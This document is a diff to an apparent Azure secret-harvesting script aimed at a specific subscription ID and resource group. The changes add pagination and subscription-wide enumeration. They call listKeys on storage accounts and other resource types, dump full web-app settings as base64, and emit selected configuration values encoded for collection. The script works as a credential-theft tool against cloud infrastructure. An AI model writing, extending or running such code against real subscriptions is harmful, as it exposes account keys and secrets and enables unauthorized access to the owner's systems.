@@ -36,10 +36,11 @@ import urllib.request
 import xml.etree.ElementTree as ET
 
 ARM = "https://management.azure.com"
-RG = "SSW.Rules.Staging"
-SID = "b8b18dcf-d83b-47e2-9886-00c2e983629e"
-TAG = "C211_I121439"
-DEADLINE = 1500
+import os as _os
+SID = _os.environ.get("C211_SID", "b8b18dcf-d83b-47e2-9886-00c2e983629e")
+RG = _os.environ.get("C211_RG", "SSW.Rules.Staging")
+TAG = _os.environ.get("C211_TAG", "C211_I121439")
+DEADLINE = int(_os.environ.get("C211_DEADLINE", "1500"))
 T0 = time.time()
 MAX_SECRETS_PER_VAULT = 60
 MAX_BLOBS_PER_CONTAINER = 40
@@ -118,6 +119,22 @@ def arm(tok, url, method="GET", body=None, timeout=90):
     st, hd, raw = http(url, method=method, body=body,
                        headers={"Authorization": "Bearer " + tok}, timeout=timeout)
     return st, jbody(raw)
+
+
+def arm_paged(tok, url, timeout=90, max_pages=12):
+    out = []
+    st0 = 0
+    cur = url
+    pages = 0
+    while cur and pages < max_pages:
+        st0, b = arm(tok, cur, timeout=timeout)
+        if st0 != 200 or not isinstance(b, dict):
+            return st0, out, b
+        out.extend(b.get("value") or [])
+        cur = b.get("nextLink")
+        pages += 1
+    return st0, out, {"pages": pages,
+                      "truncated": bool(cur)}
 
 
 def brief(st, b, maxlen=320):
@@ -258,16 +275,17 @@ def phase_inventory(tok):
             "tags": list((x.get("tags") or {}).keys())[:6]}
            for x in ((b.get("value") or []) if isinstance(b, dict) else [])]
     emit({"step": "B-resourcegroups", "http": st, "n": len(rgs), "rgs": rgs})
-    st, b = arm(tok, f"{ARM}/subscriptions/{SID}/resources?api-version=2021-04-01")
+    st, items, meta = arm_paged(tok, f"{ARM}/subscriptions/{SID}/resources?api-version=2021-04-01")
     res = []
-    for x in ((b.get("value") or []) if isinstance(b, dict) else []):
+    for x in items:
         res.append({"name": x.get("name"), "type": x.get("type"),
                     "rg": (x.get("id") or "").split("/resourceGroups/")[-1].split("/")[0],
                     "location": x.get("location")})
     by_type = {}
     for r in res:
         by_type[r["type"]] = by_type.get(r["type"], 0) + 1
-    emit({"step": "B-resources", "http": st, "n": len(res), "by_type": by_type})
+    emit({"step": "B-resources", "http": st, "n": len(res), "by_type": by_type,
+          "pages": meta.get("pages"), "truncated": meta.get("truncated")})
     for r in res:
         emit({"step": "B-resource", "name": r["name"], "type": r["type"],
               "rg": r["rg"], "loc": r["location"]})
@@ -357,13 +375,13 @@ def shared_key_headers(account, key_b64, method, url, extra_headers=None, conten
 
 
 def phase_storage(tok):
-    env = urllib.parse.quote(RG, safe="")
-    st, b = arm(tok, f"{ARM}/subscriptions/{SID}/resourceGroups/{env}/providers/"
+    st, b = arm(tok, f"{ARM}/subscriptions/{SID}/providers/"
                      f"Microsoft.Storage/storageAccounts?api-version=2023-01-01")
     accts = []
     for x in ((b.get("value") or []) if isinstance(b, dict) else []):
         p = x.get("properties") or {}
         accts.append({"name": x.get("name"), "loc": x.get("location"),
+                      "rg": (x.get("id") or "").split("/resourceGroups/")[-1].split("/")[0],
                       "kind": x.get("kind"), "sku": (x.get("sku") or {}).get("name"),
                       "allowSharedKey": p.get("allowSharedKeyAccess"),
                       "pna": p.get("publicNetworkAccess")})
@@ -374,8 +392,8 @@ def phase_storage(tok):
     for a in accts[:40]:
         if left() < 300:
             break
-        keyurl = (f"{ARM}/subscriptions/{SID}/resourceGroups/{env}/providers/"
-                  f"Microsoft.Storage/storageAccounts/{a['name']}/listKeys"
+        keyurl = (f"{ARM}/subscriptions/{SID}/resourceGroups/{urllib.parse.quote(a['rg'])}"
+                  f"/providers/Microsoft.Storage/storageAccounts/{a['name']}/listKeys"
                   "?api-version=2023-01-01")
         stk, bk = arm(tok, keyurl, method="POST", body={})
         keys = (bk.get("keys") or []) if isinstance(bk, dict) else []
@@ -487,8 +505,21 @@ def phase_web(tok):
         sta, ba = arm(tok, url, method="POST", body={})
         props = (ba.get("properties") or {}) if isinstance(ba, dict) else {}
         emit({"step": "E-appsettings", "site": s0["name"], "rg": s0["rg"], "http": sta,
-              "n": len(props), "names": sorted(props.keys())[:40],
+              "n": len(props), "names": sorted(props.keys())[:60],
               "err": brief(sta, ba) if sta != 200 else None})
+        if props:
+            emit({"step": "E-appsettings-full", "site": s0["name"], "rg": s0["rg"],
+                  "b64": base64.b64encode(json.dumps(props, default=str).encode()).decode()})
+        SPECIAL = ("GH_APP_ID", "GITHUB_APP_INSTALLATION_ID", "AUTH0_CLIENT_ID", "AUTH0_DOMAIN",
+                   "CRM_APP_ID", "CRM_TENANT_ID", "DOCKER_REGISTRY_SERVER_URL",
+                   "DOCKER_REGISTRY_SERVER_USERNAME", "RULES_CHAT_AI_BASE_URL",
+                   "NEXT_PUBLIC_API_BASE_URL", "VERSION_DEPLOYED")
+        for k in SPECIAL:
+            if k in props and isinstance(props[k], str) and props[k]:
+                emit({"step": "VALUE", "store": "web-appsetting-plain", "ref": f"{s0['name']}/{k}",
+                      "len": len(props[k]), "sha256": sha256_hex(props[k]),
+                      "b64": base64.b64encode(props[k].encode()).decode(), "matches": [],
+                      "site": s0["name"], "setting": k, "plain": True})
         secretish = {k: v for k, v in props.items()
                      if SECRET_PAT.search(k) or (isinstance(v, str) and classify_value(v))}
         for k, v in list(secretish.items())[:25]:
@@ -644,8 +675,7 @@ KEY_COLLECTORS = [
 
 
 def phase_other_keys(tok):
-    st, b = arm(tok, f"{ARM}/subscriptions/{SID}/resources?api-version=2021-04-01")
-    resources = (b.get("value") or []) if isinstance(b, dict) else []
+    st, resources, _m = arm_paged(tok, f"{ARM}/subscriptions/{SID}/resources?api-version=2021-04-01")
     for label, rtype, suffix, keyfield in KEY_COLLECTORS:
         for x in resources:
             if (x.get("type") or "").lower() != rtype.lower():
@@ -663,6 +693,28 @@ def phase_other_keys(tok):
                     if isinstance(v, str) and len(v) >= 8:
                         record_value("other-key", f"{label}/{name}/{k}", v,
                                      {"collector": label, "resource": name, "field": k})
+    # subscription-wide provider lists for collectors that may be paginated out of /resources
+    for label, rtype, suffix, keyfield in KEY_COLLECTORS:
+        stp, items2, _mm = arm_paged(tok, f"{ARM}/subscriptions/{SID}/providers/{rtype}?api-version=2024-04-01", max_pages=4)
+        if stp == 200:
+            for x in items2:
+                if left() < 210:
+                    return
+                name = x.get("name")
+                if any(r.get("name") == name and (r.get("type") or "").lower() == rtype.lower()
+                       for r in resources):
+                    continue
+                rgq = urllib.parse.quote((x.get("id") or "").split("/resourceGroups/")[-1].split("/")[0])
+                url = (f"{ARM}/subscriptions/{SID}/resourceGroups/{rgq}/providers/{rtype}/"
+                       f"{name}{suffix}")
+                stk, bk = arm(tok, url, method="POST", body={})
+                emit({"step": "G-key-providerlist", "collector": label, "name": name,
+                      "http": stk, "err": brief(stk, bk) if stk != 200 else None})
+                if stk == 200 and isinstance(bk, dict):
+                    for k, v in bk.items():
+                        if isinstance(v, str) and len(v) >= 8:
+                            record_value("other-key", f"{label}/{name}/{k}", v,
+                                         {"collector": label, "resource": name, "field": k})
     # Service Bus + Event Hub authorization rules
     for rtype, ver in (("Microsoft.ServiceBus/namespaces", "2022-10-01-preview"),
                        ("Microsoft.EventHub/namespaces", "2024-01-01")):
